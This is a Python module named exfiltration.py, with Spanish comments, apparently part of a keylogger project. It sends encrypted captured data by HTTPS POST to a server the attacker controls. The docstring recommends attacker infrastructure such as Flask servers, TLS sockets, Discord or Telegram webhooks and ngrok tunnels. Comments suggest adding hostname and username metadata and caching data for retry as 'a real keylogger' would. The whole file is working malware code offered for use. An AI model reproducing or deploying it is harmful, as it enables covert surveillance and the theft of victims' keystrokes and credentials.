"""
exfiltration.py
Módulo responsable de enviar los datos cifrados al atacante de forma periódica.

Opciones recomendadas para el proyecto:
1. HTTPS POST a un servidor Flask/FastAPI controlado por ti (mejor opción).
2. Socket TCP con TLS.
3. Para pruebas muy simples: guardar en archivo local o usar webhook (Discord/Telegram) + cifrado.

En este archivo implementaremos un cliente HTTP simple usando 'requests'.
El servidor debe estar corriendo en otra máquina virtual o con túnel (ngrok).
"""

import requests
import json
from config import SERVER_URL
from datetime import datetime


def send_encrypted_data(encrypted_payload: str) -> bool:
    """
    Envía el payload ya cifrado al servidor.
    El payload es un string base64 (resultado de crypto_utils.encrypt).
    """
    try:
        data = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "payload": encrypted_payload,
            # Puedes añadir más metadatos útiles (hostname, username, etc.)
        }

        response = requests.post(
            SERVER_URL,
            json=data,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )

        if response.status_code == 200:
            print(f"[+] Datos enviados exitosamente. Respuesta: {response.text}")
            return True
        else:
            print(f"[-] Error del servidor: {response.status_code} - {response.text}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Error de conexión al enviar datos: {e}")
        # En un keylogger real se guardaría en disco para reintento posterior
        return False
